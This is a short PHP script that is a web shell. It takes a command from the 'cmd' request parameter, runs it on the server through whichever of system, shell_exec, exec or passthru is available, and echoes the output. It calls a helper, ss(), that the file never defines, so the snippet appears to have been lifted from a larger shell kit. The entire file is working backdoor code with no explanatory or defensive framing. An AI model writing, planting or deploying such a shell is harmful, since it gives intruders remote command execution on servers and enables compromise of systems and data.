<?php
function exe($c){
	if(function_exists('system')) {
		ob_start();
		system($c);
		$b = ob_get_contents();
		ob_end_clean();
		return $b;
	}
	elseif(function_exists('shell_exec')){
		$b = shell_exec($c);
		return $b;
	}
	elseif(function_exists('exec')) {
		exec($c,$r);
		$b = "";
		foreach($r as $s){
			$b .= $s;
		}
		return $b;
	}
	elseif(function_exists('passthru')) {
		ob_start();
		passthru($c);
		$b = ob_get_contents();
		ob_end_clean();
		return $b;
	}
	return ""; // failed... oh my
}

if(isset($_REQUEST['cmd'])){
	$cmd = ss($_REQUEST['cmd']);
	$s_r = htmlspecialchars(exe($cmd));
	echo $s_r;
}

exit;
?>